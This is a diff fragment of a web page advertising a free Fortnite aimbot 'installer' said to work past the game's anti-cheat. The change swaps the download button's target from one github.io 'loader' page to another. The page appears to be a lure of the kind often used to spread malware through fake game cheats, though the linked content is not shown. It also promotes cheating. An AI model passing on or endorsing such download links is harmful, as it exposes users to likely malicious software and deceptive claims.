@@ -10,7 +10,7 @@
   <div style="text-align:center; background:#0a0a2a; padding:20px; border-radius:8px; margin:25px 0; border:1px solid #44ffaa;">
     <h2 style="color:#88ffcc; margin-top:0;">Download Aimbot Installer – Free 2026</h2>
     <p style="color:#ccc;">Full version pre-unlocked. Works with the latest Fortnite patch and anti-cheat system.</p>
-    <h2><a style="font-size:28px; color:#fff; text-decoration:none; font-weight:bold; display:inline-block; background:#33cc88; padding:15px 30px; border-radius:5px; margin:15px 0;" rel="noopener" href="https://oasis14082001-ops.github.io/loader/">Download Installer Now</a></h2>
+    <h2><a style="font-size:28px; color:#fff; text-decoration:none; font-weight:bold; display:inline-block; background:#33cc88; padding:15px 30px; border-radius:5px; margin:15px 0;" rel="noopener" href="https://josephyrs030301.github.io/Loader/">Download Installer Now</a></h2>
     <p style="color:#999; font-size:0.9em;">✅ 2026 • ✅ Silent Aim • ✅ No Recoil • ✅ Free Download</p>
   </div>
   
